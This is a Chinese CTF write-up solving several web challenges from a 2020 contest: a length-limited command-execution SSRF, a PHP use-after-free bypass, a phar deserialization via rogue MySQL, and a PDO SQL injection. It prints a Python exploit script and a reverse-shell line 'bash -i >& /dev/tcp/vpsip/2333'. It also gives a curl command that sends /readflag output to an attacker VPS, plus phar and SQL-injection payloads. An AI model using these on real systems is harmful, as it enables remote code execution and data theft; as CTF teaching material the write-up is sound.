<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$url 三重检测</p>
<ul>
<li><code>filter_var($url, FILTER_VALIDATE_URL)</code><br><img src="/2020/03/09/高校战疫联赛部分Writeup/1.png" alt></li>
<li><code>preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)</code><br><img src="/2020/03/09/高校战疫联赛部分Writeup/2.png" alt><br>不能出现<code>data://</code>或者<code>&amp;</code>或者<code>|</code>或者<code>./</code></li>
<li><code>preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])</code>        //这个也不算检测<br>一时间没想起<code>ByteCTF的boring_code</code>还是太菜了，大师傅的提醒下找了几篇Writeup，找了一下午大部分都是<code>花钱买域名</code>    、<code>利用百度网盘或者百度搜索跳转</code>或者<code>利用百度302跳转</code><br>最后师傅告我有个<code>compress.zlib://data</code><br><img src="/2020/03/09/高校战疫联赛部分Writeup/3.png" alt><br>能执行命令了，但是没有回显，而且每次执行命令长度不能超过4⃣️<br>老题了<code>hitcon-ctf-2017的babyfirst-revenge-v2</code><br>参考文章<a href="https://blog.csdn.net/nzjdsds/article/details/102940762" target="_blank" rel="noopener">不止这一个</a><br>exp.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line">url = <span class="string">'http://121.36.222.22:88/core/'</span></span><br><span class="line">url1 = <span class="string">'http://121.36.222.22:88/upload_sign.php'</span></span><br><span class="line">post1=&#123;</span><br><span class="line">    <span class="string">"sign"</span>:<span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:2:"ls";&#125;'</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"compress.zlib://data:@127.0.0.1/888?,&#123;&#125;"</span></span><br><span class="line">req.post(url1,data=post1)</span><br><span class="line">text = req.get(url).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="keyword">if</span> len(text)&lt;<span class="number">15</span>:</span><br><span class="line">    print(text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"payload1.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        i=i.rstrip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="comment">#print(payload.format(i))</span></span><br><span class="line">        post_payload=&#123;</span><br><span class="line">            <span class="string">"url"</span>:payload.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        print(post_payload)</span><br><span class="line">        text = req.post(url,data=post_payload).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> len(text)&gt;<span class="number">42</span>:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"[+]"</span>+payload.format(i)+<span class="string">'\n'</span>+text)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>payload1.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">&gt;sh</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\%7C\		##上面三重检测的第二个过滤了|,url编码一下就🉑️</span><br><span class="line">&gt;0\</span><br><span class="line">&gt;18\</span><br><span class="line">&gt;5.\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;8.\</span><br><span class="line">&gt;14\</span><br><span class="line">&gt;7.\</span><br><span class="line">&gt;20\</span><br><span class="line">&gt;\%20\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh%20x</span><br><span class="line">sh%20g</span><br></pre></td></tr></table></figure>

<p>把<code>payload1.txt</code>中间的IP换成自己vps的，然后放反弹shell<code>bash -i &gt;&amp; /dev/tcp/vpsip/2333 0&gt;&amp;1</code><br>监听端口，<code>cat /flag</code></p>
<h2><span id="php-uaf">PHP-UAF</span></h2><p>老题了（第一次好像是2019EIS—ezpass），直接上exp了<br>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_ basedir'</span>, <span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sub'</span>);</span><br><span class="line">chdir(<span class="string">'sub'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"><span class="comment">//https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</span></span><br><span class="line">(下面太长了就不粘贴出来了，二进制👴写的咱也看不懂</span><br></pre></td></tr></table></figure>

<h2><span id="webct">webct</span></h2><p>给了一个远程mysql的服务，和上传<br><code>www.zip</code>源码泄漏</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$a = <span class="keyword">new</span> Listfile(<span class="string">'/;/readflag; curl http://vpsip/`/readflag`'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Fileupload($a);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"1.phar"</span>, <span class="string">"1.gif"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>rogue mysq server 触发⼀下<br><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a><br>将filelist改为算好的<code>phar</code>路径</p>
<h2><span id="sqlcheckin">sqlcheckin</span></h2><p>查看源码，给了部分源码，<code>PDO</code>注入的话只见过宽字节</p>
<p><code>select * from users where username = &#39;admin&#39;-0-&#39;&#39;;</code></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
</search>
